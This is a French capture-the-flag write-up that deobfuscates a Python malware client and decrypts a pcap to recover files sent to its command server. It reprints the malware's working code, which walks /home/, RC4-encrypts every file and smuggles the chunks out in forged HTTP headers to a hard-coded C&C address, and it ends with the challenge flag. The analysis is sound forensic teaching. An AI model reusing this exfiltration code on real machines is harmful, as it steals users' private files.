# Take it down

Ce challenge a été réalisé pour les qualifications de l'ECSC qui avait lieu en parallèle du wargame de Lehack. Il a été release pour tous une heure après la release pour les personnes qualifiées pour l'ECSC. J'ai pu donc le commencer une heure après eux.

L'objectif est de retrouver l'identité d'une victime d'un malware où il a été possible de rediriger le flux entre le malware et le serveur de contrôle vers un raspberry pi pour récupérer les trames zéro.

Nous avons à notre disposition 2 fichiers :
- une capture pcap ([sinkhole_capture.pcap](sinkhole_capture.pcap))
- un script python obfusqué décrivant les échanges entre le malware et le serveur C&C ([client.py](client.py))

## Déobfuscation

Il est possible de regarder le pcap pour y voir des requêtes https et des syn/ack réguliers.
Nous allons donc étudier le script python. Il est obfusqué.

Commençons par la partie main :

```python
gb3ccd4n8kd = noraj()
obnco(gb3ccd4n8kd)
wnytyx(gb3ccd4n8kd)
```

Commençons par `noraj` :

```python
def noraj():
    txkvoqw554hn = []
    for r, d, f in os.walk('/home/'):
        for file in f:
            txkvoqw554hn.append(os.path.join(r, file))
    return txkvoqw554hn
```

Simple ici avec le `os.walk`, c'est l'équivalent d'un ls python. Le script va donc lister tous les fichiers de tous les utilisateurs.

La liste des fichiers est donnée en paramètre à `obnco` et à `wnytyx` :

```python
def obnco(xgyvjx7):
    a = '\n'.join(xgyvjx7)
    b = ej6h13cyvp(a.encode().hex())
    send_it(b)


def wnytyx(do7u6r1b):
    for fe in do7u6r1b:
        with open(fe, 'rb') as f:
            q = ej6h13cyvp(binascii.hexlify(f.read()).decode())
            send_it(q)
        f.closed
```

`obnco` va envoyer la liste des fichiers au serveur C&C en faisant d'abord une opération sur les données. Dans le cas de `wnytyx`, c'est le contenu de chaque fichier qui est envoyé au serveur C&C.

## La transmission

Avant d'attaquer `send_it`, vérifions les transformations qui sont faites à l'aide de la fonction `ej6h13cyvp`:

```python
def ej6h13cyvp(zy102a):
    dmlidvl = []
    kpr2m8 = 0o0
    while True:
        ohno = 0o40
        dmlidvl.append(zy102a[kpr2m8:kpr2m8+ohno])
        kpr2m8 = kpr2m8 + ohno
        if kpr2m8 >= len(zy102a)-1:
            break
    return dmlidvl
```

Voici le code en clair :

```python
def gen_array_32bytes(string):
    res = []
    i = 0
    while True:
        res.append(string[i:i+32])
        i = i + 32
        if i >= len(string)-1:
            break
    return res
```

Et le paramètre c'est des octets encodés en hexadécimal. La fonction crée donc une liste de blocs de 32 caractères correspondant à 16 octets de données. Ces blocs sont passés à la fonction send_it :

```python
def send_it(hnij5s):
    qu3jozz36o1 = random.randint(0o1750, 0o21450)
    dip = '192.168.1.30'
    dport = 8080
    gg = [hnij5s[x:x+10] for x in range(0, len(hnij5s), 10)]
    for g in gg:
        seq = random.randrange(0, (2**32)-1)
        sport = random.randint(0o135422, 0o147256)
        syn = IP(dst=dip) / TCP(sport=sport, dport=dport, seq=seq, flags='S')
        last_req = sr1(syn, timeout=5)
        send(IP(dst=dip) / TCP(sport=sport, dport=dport,
                               seq=syn[TCP].seq + 0o1, ack=last_req[TCP].seq + 0o1, flags='A'))
        seq, ack = req(last_req, g, qu3jozz36o1)
        sr1(IP(dst=dip) / TCP(sport=sport, dport=dport, seq=seq, ack=ack, flags='FA'))
        send(IP(dst=dip) / TCP(sport=sport, dport=dport,
                               seq=seq + 0o1, ack=ack + 0o1, flags='A'))
        time.sleep(1)
    return True
```

Le script utilise Scapy pour créer sa communication avec son serveur C&C. Il suffit de suivre la trace des données.
Donc les données sont `hnij5s` puis ensuite `gg` (10 blocs de données sont envoyés pour chaque connexion tcp) puis `g` qui est envoyé à la méthode `req` :

```python
def req(syn_ack, lcyoa21, qu3jozz36o1):
    seq = syn_ack[TCP].ack
    ack = syn_ack[TCP].seq + 0o1
    for data in lcyoa21:
        g8uwxfy = base64.b64encode(dfqguvb8qz4cas9(
            str(ack), data).encode()).decode()
        key = str(random.randint(0o1750, 0o21450)).encode().hex()
        d = base64.b64encode(str(random.randint(0o16432451210000, 0o202757163310000)).encode(
        ).hex().encode()).decode().encode().hex()
        getStr = 'GET /panel.php?id={}&key={}&data={} HTTP/1.1\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.5\r\nCache-Control: max-age=0\r\nHost: www.gogole.com\r\nConnection: keep-alive\r\nContent-MD5: {}\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\r\n\r\n'.format(
            qu3jozz36o1, key, d, g8uwxfy)
        reply = sr1(IP(dst=syn_ack[IP].src) / TCP(dport=syn_ack[TCP].sport,
                                                  sport=syn_ack[TCP].dport, seq=seq, ack=ack, flags='PA') / getStr, timeout=5)
        seq = reply[TCP].ack
        ack = len(reply[TCP].payload)
        if len(reply[TCP].payload) == 0o6:
            ack = reply[TCP].seq + 0o562
        elif len(reply[TCP].payload) != 0o562:
            ack = reply[TCP].seq + len(reply[TCP].payload) + 0o1
        else:
            ack = reply[TCP].seq + len(reply[TCP].payload)
        send(IP(dst=syn_ack[IP].src) / TCP(dport=syn_ack[TCP].sport,
                                           sport=reply[TCP].dport, seq=seq, ack=ack, flags='A'))
        time.sleep(0.1)
    return seq, ack
```

## Le chiffrement

Continuons le chemin, donc `g` devient le paramètre `lcyoa21` puis `data` (notre bloc de 16 octets représentés en une chaine hexa) puis `g8uwxfy` qui est passé à l'aide d'un format string à la variable `etStr` pour l'en-tête de la requête `Conten-MD5`. Entre le passage de `data` à `g8uwxfy` un appel à la fonction `dfqguvb8qz4cas9` est réalisé. En paramètre, il y a le numéro ack de la trame qui envoie nos données `getStr`.

```python
def dfqguvb8qz4cas9(k, d):
    eb3o0v9ie8 = 0o400
    dpw8ko0y3gi7h = []
    uajxoyu = list(range(eb3o0v9ie8))
    ozi4iqwms99xv = bdpw8ko0y3 = r589862eilxu = 0o0
    for pls in list(range(eb3o0v9ie8)):
        ozi4iqwms99xv = (
            ozi4iqwms99xv + uajxoyu[pls] + ord(k[pls % len(k)])) % eb3o0v9ie8
        uajxoyu[pls], uajxoyu[ozi4iqwms99xv] = uajxoyu[ozi4iqwms99xv], uajxoyu[pls]
    ozi4iqwms99xv = lq4vbnj2t = 0o0
    for xl4xr9hh in d:
        ozi4iqwms99xv = (ozi4iqwms99xv + 0o1) % eb3o0v9ie8
        lq4vbnj2t = (lq4vbnj2t + uajxoyu[ozi4iqwms99xv]) % eb3o0v9ie8
        uajxoyu[ozi4iqwms99xv], uajxoyu[lq4vbnj2t] = uajxoyu[lq4vbnj2t], uajxoyu[ozi4iqwms99xv]
        dpw8ko0y3gi7h.append(chr(ord(xl4xr9hh) ^ uajxoyu[(
            uajxoyu[ozi4iqwms99xv] + uajxoyu[lq4vbnj2t]) % eb3o0v9ie8]))
    return ''.join(dpw8ko0y3gi7h).encode().hex()
```

Par chance c'est une fonction symétrique. Des permutations sont effectuées sur un tableau représentant les caractères par des entiers en fonction de la clé qui est passé en paramètre. Puis il y a un xor sur entre chaque caractère de la donnée et le tableau final.  
Cette fonction est un RC4. Si l'on regarde le pseudo code de [Wikipedia](https://en.wikipedia.org/wiki/RC4), c'est effectivement ce qui est fait dans notre fonction.  
Nous devons donc juste faire attention aux encodages qui sont réalisés.
Ce qui donne pour retrouver les octets à partir du chiffré :

```python
from Crypto.Cipher import ARC4

def rc4(k, d):
    d = binascii.unhexlify(d).decode().encode('latin-1')
    cipher = ARC4.new(k.encode())
    return binascii.unhexlify(cipher.decrypt(d))
```

Attention, ARC4 ne prend que des octets en entrées, il faut donc convertir les données comme il faut.  
Par défaut `encode` va encoder en `utf-8`, un octet sera donc ajouté lors de votre conversion. Heureusement l'encodage `latin-1` permet de résoudre ce problème.

```python
>>> '\x88'.encode()
b'\xc2\x88'
>>> '\x88'.encode('latin-1')
b'\x88'
```

## La solution finale

Pour la suite c'est assez simple, nous récupérons à l'aide de dpkt les paquets qui sont des requêtes HTTP vers l'url panel.php.

Exemple d'un paquet :

```
GET /panel.php?id=5237&key=38353532&data=4d7a457a4e6a4d774d7a677a4e6a4d314d7a637a4d6a4d794d7a677a4f444d354d7a673d HTTP/1.1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Cache-Control: max-age=0
Host: www.gogole.com
Connection: keep-alive
Content-MD5: YzI4ODc3YzJhZjA0N2ZjMzhjNGEzOWMzOWZjM2E5YzNhM2MyYWFjMjhkYzI5NGMyYjdjMmEyYzJiZTAwNzQzOWMyYmQ0NWMyYjRjM2FlYzM4M2MzOTI2MGMzYTAzOWMzODIwYjNl
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36

data = 1608657228898
```

Dés que l'on détecte une donnée d'un paquet inférieur à 16 octets, nous savons alors que nous changeons de fichiers ou que c'est la fin du `ls`
Si un fichier fait moins de 16 octets, ça marche aussi.

Il est possible d'améliorer le script en récupérant la liste des fichiers puis d'enregistrer les fichiers récupérés avec ces noms.

[Script Final](script.py)

Ce qui nous donne quelques fichiers, dont un fichier info_perso.zip. L'énoncé challenge nous disait de retrouver l'identité de la victime. Il suffit de dézipper puis de cat le fichier pour avoir le flag.

```bash
$ unzip _home_pi_perso_info_perso.zip 
Archive:  _home_pi_perso_info_perso.zip
  inflating: info_perso.txt          
$ cat info_perso.txt 
Vous venez de retrouver des informations sur la victime !
Flag :
lh_3cd2d5296cc2bea8dbaf47ca23f82e1d5ca9b01668426ad07c653877e31d718c
```

